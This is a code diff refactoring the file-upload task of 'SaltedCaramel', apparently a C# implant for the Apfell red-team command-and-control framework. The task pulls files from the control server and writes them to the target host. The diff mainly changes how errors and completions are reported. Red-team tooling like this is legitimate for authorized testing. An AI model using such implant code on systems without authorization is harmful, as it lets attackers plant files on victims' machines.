@@ -3,6 +3,7 @@ using Newtonsoft.Json.Linq;
 using System;
 using System.Diagnostics;
 using System.IO;
+using SaltedCaramel.Jobs;
 
 /// <summary>
 /// This task will upload a specified file from the Apfell server to the implant at the given file path
@@ -16,8 +17,9 @@ namespace SaltedCaramel.Tasks
             return implant.Profile.GetFile(file_id, implant);
         }
 
-        public static void Execute(SCTask task, SCImplant implant)
+        public static void Execute(Job job, SCImplant implant)
         {
+            SCTask task = job.Task;
             JObject json = (JObject)JsonConvert.DeserializeObject(task.@params);
             string file_id = json.Value<string>("file_id");
             string filepath = json.Value<string>("remote_path");
@@ -28,7 +30,8 @@ namespace SaltedCaramel.Tasks
             if (File.Exists(filepath))
             {
                 Debug.WriteLine($"[!] Upload - ERROR: File exists: {filepath}");
-                implant.Profile.SendError(task.id, "ERROR: File exists.");
+                job.Task.message = "ERROR: File exists.";
+                implant.TrySendError(job);
             }
             else
             {
@@ -40,20 +43,22 @@ namespace SaltedCaramel.Tasks
                     {
                         // Write file to disk
                         File.WriteAllBytes(filepath, output);
-                        implant.Profile.SendComplete(task.id);
+                        implant.TrySendComplete(task.id);
                         Debug.WriteLine("[+] Upload - File written: " + filepath);
                     }
                     catch (Exception e) // Catch exceptions from file write
                     {
                         // Something failed, so we need to tell the server about it
-                        implant.Profile.SendError(task.id, e.Message);
+                        job.Task.message = e.Message;
+                        implant.TrySendError(job);
                         Debug.WriteLine("[!] Upload - ERROR: " + e.Message);
                     }
                 }
                 catch (Exception e) // Catch exceptions from HTTP request
                 {
                     // Something failed, so we need to tell the server about it
-                    implant.Profile.SendError(task.id, e.Message);
+                    job.Task.message = e.Message;
+                    implant.TrySendError(job);
                     Debug.WriteLine("[!] Upload - ERROR: " + e.Message);
                 }
             }
